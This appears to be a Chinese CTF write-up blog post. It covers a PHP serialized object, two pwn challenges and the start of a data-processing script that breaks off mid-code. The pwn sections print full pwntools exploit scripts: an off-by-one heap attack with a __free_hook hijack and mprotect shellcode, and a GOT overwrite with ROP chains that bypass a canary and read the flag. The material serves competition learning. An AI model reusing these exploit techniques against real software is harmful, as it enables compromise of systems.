<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;popmart&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;yuki&quot;</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;tell me where&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;molly&quot;</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;dont_tell_you&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;dimoo&quot;</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;you_can_guess&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>

<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908708.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="2-1"><a href="#2-1" class="headerlink" title="2-1"></a>2-1</h3><p>发现开了沙盒，禁用execve</p>
<p>Add功能正常,Free功能无uaf , edit功能存在off by one</p>
<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908667.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>gift功能</p>
<p>输入1可以泄露堆地址，输入其他的可以泄露bss地址，拿到pie</p>
<p>off by one打bss上的stdout结构体为p64(0xfbad1800) + p64(0)*3 + b’\x00’</p>
<p>泄露libc，打freehook为setcontext，最后free触发，即可orw拿到flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*  <br>elf=ELF(<span class="hljs-string">&#x27;./ezheap&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./ezheap&#x27;) </span><br>p=remote(<span class="hljs-string">&#x27;139.155.126.78&#x27;</span>,<span class="hljs-number">32467</span>)<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>):<br>    p.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>):<br>    p.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>):<br>    p.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>):<br>    p.sendlineafter(a, b)   <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">li</span>(<span class="hljs-params">a</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(a))     <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>():<br>    p.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>():<br>    <span class="hljs-built_in">print</span>(p.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rl</span>(<span class="hljs-params">a</span>):<br>    <span class="hljs-keyword">return</span> p.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>():<br>    p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_32</span>():<br>    <span class="hljs-keyword">return</span> u32(p.recvuntil(<span class="hljs-string">b&#x27;\xf7&#x27;</span>)[-<span class="hljs-number">4</span>:])    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br>    <span class="hljs-keyword">return</span> u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_sb</span>():<br>    <span class="hljs-keyword">return</span> libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>], libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bug</span>():<br>    gdb.attach(p)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">i</span>):<br>    sla(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>,<span class="hljs-built_in">str</span>(i))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size</span>):<br>    cmd(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">b&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sla(<span class="hljs-string">b&#x27;Size:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    cmd(<span class="hljs-number">3</span>)<br>    sla(<span class="hljs-string">b&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    cmd(<span class="hljs-number">4</span>)    <br>    sla(<span class="hljs-string">b&#x27;choose:&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,con</span>):<br>    cmd(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">b&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sa(<span class="hljs-string">b&#x27;context:&#x27;</span>,con)<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x18</span>)  <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x68</span>)  <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x68</span>)  <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x18</span>)  <span class="hljs-comment">#3</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x18</span>+p8(<span class="hljs-number">0xe1</span>))<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0xd8</span>)  <br>show(<span class="hljs-number">4</span>)<br>rl(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>pie=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">0x202160</span><br>li(pie)<br>free(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x68</span>+p64(<span class="hljs-number">0x71</span>)+p64(pie+<span class="hljs-number">0x202020</span>)) <br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x68</span>)<br>edit(<span class="hljs-number">7</span>,p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>libc_base=get_addr()-<span class="hljs-number">0x3ed8b0</span><br>li(libc_base)<br><br>rdi = libc_base+libc.search(asm(<span class="hljs-string">&quot;pop rdi\nret&quot;</span>)).__next__()<br>rsi = libc_base+libc.search(asm(<span class="hljs-string">&quot;pop rsi\nret&quot;</span>)).__next__()<br>rdx = libc_base+libc.search(asm(<span class="hljs-string">&quot;pop rdx\nret&quot;</span>)).__next__()<br>rax = libc_base+libc.search(asm(<span class="hljs-string">&quot;pop rax\nret&quot;</span>)).__next__()<br>ret = libc_base+libc.search(asm(<span class="hljs-string">&quot;ret&quot;</span>)).__next__()<br>syscall=libc_base+libc.search(asm(<span class="hljs-string">&quot;syscall\nret&quot;</span>)).__next__()<br>jmp_rsp=libc_base+libc.search(asm(<span class="hljs-string">&quot;jmp rsp&quot;</span>)).__next__()<br>free_hook=libc_base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>setcontext=libc_base+libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]+<span class="hljs-number">53</span><br>open_addr=libc_base+libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>read_addr=libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write_addr=libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br>payload=(<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x68</span>+p64(<span class="hljs-number">0</span>)+p64(free_hook&amp;<span class="hljs-number">0xfffffffffffff000</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(<span class="hljs-number">0x2000</span>)).ljust(<span class="hljs-number">0xa0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64(free_hook&amp;<span class="hljs-number">0xfffffffffffff000</span>)+p64(syscall)<br><br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x18</span>)<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x58</span>)<br>add(<span class="hljs-number">10</span>,<span class="hljs-number">0x58</span>)<br>add(<span class="hljs-number">11</span>,<span class="hljs-number">0x18</span>)<br>edit(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x18</span>+p8(<span class="hljs-number">0xc1</span>))<br>free(<span class="hljs-number">9</span>)<br>add(<span class="hljs-number">12</span>,<span class="hljs-number">0xb8</span>)<br>free(<span class="hljs-number">10</span>)<br>edit(<span class="hljs-number">12</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x58</span>+p64(<span class="hljs-number">0x61</span>)+p64(free_hook)) <br>add(<span class="hljs-number">13</span>,<span class="hljs-number">0x58</span>)<br>add(<span class="hljs-number">14</span>,<span class="hljs-number">0x58</span>)<br>edit(<span class="hljs-number">14</span>,p64(setcontext))<br>add(<span class="hljs-number">15</span>,<span class="hljs-number">0x400</span>)<br>edit(<span class="hljs-number">15</span>,payload)<br><br>free(<span class="hljs-number">15</span>)<br>payload  = p64(rdi)+p64(free_hook&amp;<span class="hljs-number">0xfffffffffffff000</span>)<br>payload += p64(rsi)+p64(<span class="hljs-number">0x1000</span>)<br>payload += p64(rdx)+p64(<span class="hljs-number">7</span>)<br>payload += p64(rax)+p64(<span class="hljs-number">10</span>)<br>payload += p64(syscall) <span class="hljs-comment">#mprotect(free_hook&amp;0xfffffffffffff000,0x1000,7)</span><br>payload += p64(jmp_rsp)<br>payload += asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>))<br>payload += asm(shellcraft.read(<span class="hljs-number">3</span>,free_hook+<span class="hljs-number">0x300</span>,<span class="hljs-number">0x30</span>))<br>payload += asm(shellcraft.write(<span class="hljs-number">1</span>,free_hook+<span class="hljs-number">0x300</span>,<span class="hljs-number">0x30</span>))<br><br>sl(payload)<br><br>inter()<br></code></pre></td></tr></table></figure>

<h3 id="2-2"><a href="#2-2" class="headerlink" title="2-2"></a>2-2</h3><p>Inequable_Canary</p>
<p>观察ida</p>
<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908805.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>同时看到题目给了有jmp rsp的gadget，限制了execve系统调用，需要orw，一开始思路就是往栈上写入shellcode然后跳转过去执行在vuln函数中还有个任意地址写8字节，因为buf读入的数据长度是0x10,因此可以覆盖到v3，sys_read(0, v3, 8uLL);就是任意地址写8字节因为没有leak的途径，因此显然需要利用这个任意地址写8字节来覆盖stack_fail_got为一个函数，进而绕过canary同时注意这里的v4是rsp+0x20，所以我一直没找到合适的方法来控制rsp指向shellcode进而jmp rsp，所以需要改变思路我们可以覆盖stack_fail_got为一个pop 3;ret，这样就可以执行v4读入的ROP链写leak出libcbase，同时再一次进入vuln函数利用这个任意地址写8字节往bss写入’flag\x00\x00\x00\x00’字符串，然后再次执行v4读入的ROP链进行ORW就打通了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-keyword">import</span> ctypes<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br>p=remote(<span class="hljs-string">&#x27;139.155.126.78&#x27;</span>,<span class="hljs-number">29348</span>)<br><span class="hljs-comment">#p=process(&#x27;./canary&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./canary&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bug</span>():  gdb.attach(p)<br>    pause()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>):<br>    p.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a,b</span>):<br>    p.sendafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>):<br>    p.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a,b</span>):<br>    p.sendlineafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>(<span class="hljs-params">a</span>):<br>    p.recv(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>(<span class="hljs-params">a</span>):<br>    <span class="hljs-built_in">print</span>(p.recv(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rl</span>(<span class="hljs-params">a</span>):<br>    <span class="hljs-keyword">return</span> p.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>():<br>    p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr64</span>():<br>    <span class="hljs-keyword">return</span> u64(p.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr32</span>():<br>    <span class="hljs-keyword">return</span> u32(p.recvuntil(<span class="hljs-string">&quot;\xf7&quot;</span>)[-<span class="hljs-number">4</span>:])<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_sb</span>():<br>    <span class="hljs-keyword">return</span> libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>],libc_base+libc.search(<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>).__next__()<br>li = <span class="hljs-keyword">lambda</span> x : <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br>ll = <span class="hljs-keyword">lambda</span> x : <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br>vuln=<span class="hljs-number">0x400820</span><br>stack_fail_got=<span class="hljs-number">0x601038</span><br><span class="hljs-comment"># dbg()</span><br>sa(<span class="hljs-string">&quot;Say some old spells to start the journey\n&quot;</span>,p64(vuln))<br><br>sa(<span class="hljs-string">&quot;Tell me the location of the Eye of the Deep Sea\n&quot;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(stack_fail_got))<br>sa(<span class="hljs-string">&quot;I have magic\n&quot;</span>,p64(<span class="hljs-number">0x400a5f</span>)) <span class="hljs-comment">#pop 3</span><br><br>pop_rdi=<span class="hljs-number">0x400a63</span><br>pop_rsi_r15=<span class="hljs-number">0x400a61</span><br>read_got=<span class="hljs-number">0x601040</span><br>write_addr=<span class="hljs-number">0x4006E0</span><br>payload=p64(pop_rdi)+p64(<span class="hljs-number">1</span>)+p64(pop_rsi_r15)+p64(read_got)+p64(<span class="hljs-number">0</span>)+p64(write_addr)+p64(vuln)<br>sa(<span class="hljs-string">&quot;Let&#x27;s go!\n&quot;</span>,payload)<br><br>libc_base=u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x10e1e0</span><br>li(<span class="hljs-built_in">hex</span>(libc_base))<br><br>bss=<span class="hljs-number">0x601060</span>+<span class="hljs-number">0x800</span><br>sa(<span class="hljs-string">&quot;Tell me the location of the Eye of the Deep Sea\n&quot;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(bss))<br>sa(<span class="hljs-string">&quot;I have magic\n&quot;</span>,<span class="hljs-string">b&#x27;flag\x00\x00\x00\x00&#x27;</span>) <span class="hljs-comment">#pop 3</span><br>pop_rdi=<span class="hljs-number">0x400a63</span><br>pop_rsi_r15=<span class="hljs-number">0x400a61</span><br>read_got=<span class="hljs-number">0x601040</span><br>write_addr=<span class="hljs-number">0x4006E0</span><br>pop_rax=libc_base+<span class="hljs-number">0x36174</span><br>pop_rdx_r12=libc_base+<span class="hljs-number">0x119431</span> <br>syscall_ret=libc_base+<span class="hljs-number">0x47656</span> <span class="hljs-comment">#syscall pop_rbp ret</span><br>payload=p64(pop_rdi)+p64(bss)+p64(pop_rsi_r15)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(pop_rax)+p64(<span class="hljs-number">2</span>)+p64(syscall_ret)+p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#open</span><br>payload+=p64(pop_rdi)+p64(<span class="hljs-number">3</span>)+p64(pop_rsi_r15)+p64(bss+<span class="hljs-number">0x100</span>)*<span class="hljs-number">2</span>+p64(pop_rdx_r12)+p64(<span class="hljs-number">0x100</span>)*<span class="hljs-number">2</span>+p64(pop_rax)+p64(<span class="hljs-number">0</span>)+p64(syscall_ret)+p64(<span class="hljs-number">0</span>)<span class="hljs-comment">#read</span><br>payload+=p64(pop_rdi)+p64(<span class="hljs-number">1</span>)+p64(pop_rsi_r15)+p64(bss+<span class="hljs-number">0x100</span>)*<span class="hljs-number">2</span>+p64(pop_rdx_r12)+p64(<span class="hljs-number">0x100</span>)*<span class="hljs-number">2</span>+p64(pop_rax)+p64(<span class="hljs-number">1</span>)+p64(syscall_ret)+p64(<span class="hljs-number">0</span>)<br>sa(<span class="hljs-string">&quot;Let&#x27;s go!\n&quot;</span>,payload)<br>inter()<br></code></pre></td></tr></table></figure>

<h2 id="DS"><a href="#DS" class="headerlink" title="DS"></a>DS</h2><h3 id="3-1"><a href="#3-1" class="headerlink" title="3-1"></a>3-1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_phone_numbers</span>(<span class="hljs-params">text</span>):<br>    <span class="hljs-comment"># 定义有效的手机号码前缀</span><br>    valid_prefixes = (<br>        <span class="hljs-string">&#x27;734&#x27;</span>, <span class="hljs-string">&#x27;735&#x27;</span>, <span class="hljs-string">&#x27;736&#x27;</span>, <span class="hljs-string">&#x27;737&#x27;</span>, <span class="hljs-string">&#x27;738&#x27;</span>, <span class="hljs-string">&#x27;739&#x27;</span>, <span class="hljs-string">&#x27;747&#x27;</span>, <span class="hljs-string">&#x27;748&#x27;</span>, <span class="hljs-string">&#x27;750&#x27;</span>, <span class="hljs-string">&#x27;751&#x27;</span>,<br>        <span class="hljs-string">&#x27;752&#x27;</span>, <span class="hljs-string">&#x27;757&#x27;</span>, <span class="hljs-string">&#x27;758&#x27;</span>, <span class="hljs-string">&#x27;759&#x27;</span>, <span class="hljs-string">&#x27;772&#x27;</span>, <span class="hljs-string">&#x27;778&#x27;</span>, <span class="hljs-string">&#x27;782&#x27;</span>, <span class="hljs-string">&#x27;783&#x27;</span>, <span class="hljs-string">&#x27;784&#x27;</span>, <span class="hljs-string">&#x27;787&#x27;</span>,<br>        <span class="hljs-string">&#x27;788&#x27;</span>, <span class="hljs-string">&#x27;795&#x27;</span>, <span class="hljs-string">&#x27;798&#x27;</span>, <span class="hljs-string">&#x27;730&#x27;</span>, <span class="hljs-string">&#x27;731&#x27;</span>, <span class="hljs-string">&#x27;732&#x27;</span>, <span class="hljs-string">&#x27;740&#x27;</span>, <span class="hljs-string">&#x27;745&#x27;</span>, <span class="hljs-string">&#x27;746&#x27;</span>, <span class="hljs-string">&#x27;755&#x27;</span>,<br>        <span class="hljs-string">&#x27;756&#x27;</span>, <span class="hljs-string">&#x27;766&#x27;</span>, <span class="hljs-string">&#x27;767&#x27;</span>, <span class="hljs-string">&#x27;771&#x27;</span>, <span class="hljs-string">&#x27;775&#x27;</span>, <span class="hljs-string">&#x27;776&#x27;</span>, <span class="hljs-string">&#x27;785&#x27;</span>, <span class="hljs-string">&#x27;786&#x27;</span>, <span class="hljs-string">&#x27;796&#x27;</span>, <span class="hljs-string">&#x27;733&#x27;</span>,<br>        <span class="hljs-string">&#x27;749&#x27;</span>, <span class="hljs-string">&#x27;753&#x27;</span>, <span class="hljs-string">&#x27;773&#x27;</span>, <span class="hljs-string">&#x27;774&#x27;</span>, <span class="hljs-string">&#x27;777&#x27;</span>, <span class="hljs-string">&#x27;780&#x27;</span>, <span class="hljs-string">&#x27;781&#x27;</span>, <span class="hljs-string">&#x27;789&#x27;</span>, <span class="hljs-string">&#x27;790&#x27;</span>, <span class="hljs-string">&#x27;791&#x27;</span>,<br>        <span class="hljs-string">&#x27;793&#x27;</span>, <span class="hljs-string">&#x27;799&#x27;</span>  <span class="hljs-comment"># 确保这个列表是完整的</span><br>    )<br>    <br>    <span class="hljs-comment"># 创建正则表达式模式，提取以有效前缀开头的完整手机号码</span><br>    pattern = <span class="hljs-string">r&#x27;(?&lt;!\d)(&#x27;</span> + <span class="hljs-string">&#x27;|&#x27;</span>.join(valid_prefixes) + <span class="hljs-string">r&#x27;)(\d&#123;8&#125;)(?!\d)&#x27;</span><br>    matches = re.findall(pattern, text)<br>    <br>    <span class="hljs-comment"># 返回完整的手机号码</span><br>    <span class="hljs-keyword">return</span> [prefix + number <span class="hljs-keyword">for</span> prefix, number <span class="hljs-keyword">in</span> matches]<br><br><span class="hljs-comment"># 读取txt文件</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_txt_file</span>(<span class="hljs-params">file_path</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        <span class="hljs-keyword">return</span> file.read()<br><br><span class="hljs-comment"># 将提取的手机号码保存到CSV文件</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">save_to_csv</span>(<span class="hljs-params">phone_numbers, output_file</span>):<br>    df = pd.DataFrame(phone_numbers, columns=[<span class="hljs-string">&#x27;手机号码&#x27;</span>])<br>    df.to_csv(output_file, index=<span class="hljs-literal">False</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;提取的手机号码: <span class="hljs-subst">&#123;phone_numbers&#125;</span>&#x27;</span>)  <span class="hljs-comment"># 输出提取的手机号码</span><br><br><span class="hljs-comment"># 主函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    input_file = <span class="hljs-string">&#x27;data.txt&#x27;</span>  <span class="hljs-comment"># 这里替换为你的txt文件路径</span><br>    output_file = <span class="hljs-string">&#x27;output.csv&#x27;</span>  <span class="hljs-comment"># 这里替换为你想要保存的CSV文件路径</span><br><br>    <span 